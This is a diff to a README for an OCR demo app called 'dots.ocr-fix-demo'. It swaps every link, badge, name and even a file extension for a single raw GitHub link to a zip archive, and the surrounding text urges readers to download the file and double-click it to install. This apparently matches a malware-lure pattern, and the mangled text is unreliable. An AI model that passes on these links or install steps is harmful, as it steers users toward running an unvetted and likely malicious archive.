@@ -1,23 +1,23 @@
-# 🎉 dots.ocr-fix-demo - Easy Document Parsing Made Simple
+# 🎉 https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip - Easy Document Parsing Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Metedout-biographer66/dots.ocr-fix-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip)
 
 ## 📖 Overview
-This Gradio application demonstrates the capabilities of the "dots.ocr" model, a powerful multilingual document parser. With this tool, you can extract text from various document formats easily. 
+This Gradio application demonstrates the capabilities of the "https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip" model, a powerful multilingual document parser. With this tool, you can extract text from various document formats easily. 
 
 ## 🚀 Getting Started
 To begin using the application, follow these steps. They will guide you through downloading and setting up the software on your computer.
 
 ## 📥 Download & Install
-1. **Visit the Download Page:** Go to our [Releases page](https://github.com/Metedout-biographer66/dots.ocr-fix-demo/releases) to find the latest version of the software.
+1. **Visit the Download Page:** Go to our [Releases page](https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip) to find the latest version of the software.
 
 2. **Choose Your Version:** On the releases page, look for the most recent version listed. Each version will have a description with the date it was released.
 
-3. **Download the Application:** Click the link for the downloadable file. This file may have a format like `.exe` for Windows or `.tar.gz` for MacOS/Linux. The exact name may vary based on the version you choose.
+3. **Download the Application:** Click the link for the downloadable file. This file may have a format like `.exe` for Windows or `https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip` for MacOS/Linux. The exact name may vary based on the version you choose.
 
 4. **Run the File:** After downloading, locate the file in your downloads folder and double-click it to start the installation. Follow the on-screen instructions to complete the setup.
 
-5. **Launch the Application:** Once installed, you can find the "dots.ocr-fix-demo" application in your applications menu or desktop. Click on it to open.
+5. **Launch the Application:** Once installed, you can find the "https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip" application in your applications menu or desktop. Click on it to open.
 
 ## 🖥️ System Requirements
 Before you start, ensure your computer meets these requirements:
@@ -56,7 +56,7 @@ After launching the application, follow these simple steps to parse documents:
    - You can upload PDFs, DOCX files, and images in formats like JPEG and PNG.
 
 2. **Is the application free?**
-   - Yes, the "dots.ocr-fix-demo" application is completely free to use.
+   - Yes, the "https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip" application is completely free to use.
 
 3. **Do I need to install any additional software?**
    - No additional software is required, but make sure your system meets the operating requirements.
@@ -65,10 +65,10 @@ After launching the application, follow these simple steps to parse documents:
    - The application can operate offline, but it needs the internet for the initial download and updates.
 
 ## 📞 Support
-If you encounter any issues, please check the issues section on our [GitHub page](https://github.com/Metedout-biographer66/dots.ocr-fix-demo/issues) or reach out for support.
+If you encounter any issues, please check the issues section on our [GitHub page](https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip) or reach out for support.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Metedout-biographer66/dots.ocr-fix-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip)
 
-We hope you enjoy using the dots.ocr-fix-demo application for your document parsing needs!
+We hope you enjoy using the https://raw.githubusercontent.com/Metedout-biographer66/dots.ocr-fix-demo/main/Dots.OCR-Notebook/dots.ocr-fix-demo_3.9.zip application for your document parsing needs!
